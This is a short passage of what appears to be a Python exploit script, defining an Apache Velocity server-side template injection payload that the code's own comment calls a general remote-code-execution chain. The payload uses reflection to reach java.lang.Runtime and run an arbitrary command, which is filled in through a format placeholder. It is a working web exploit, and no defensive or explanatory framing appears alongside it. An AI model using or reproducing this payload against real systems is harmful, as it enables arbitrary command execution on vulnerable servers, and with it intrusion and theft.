    \ Apache Velocity SSTI payload (通用RCE链)\n    velocity_payload = (\n        \"\
    #set($x='')\"\n        \"#set($rt=$x.class.forName('java.lang.Runtime'))\"\n \
    \       \"#set($ex=$rt.getRuntime().exec('{}'))\"\n        \"$ex.waitFor()\"\n\
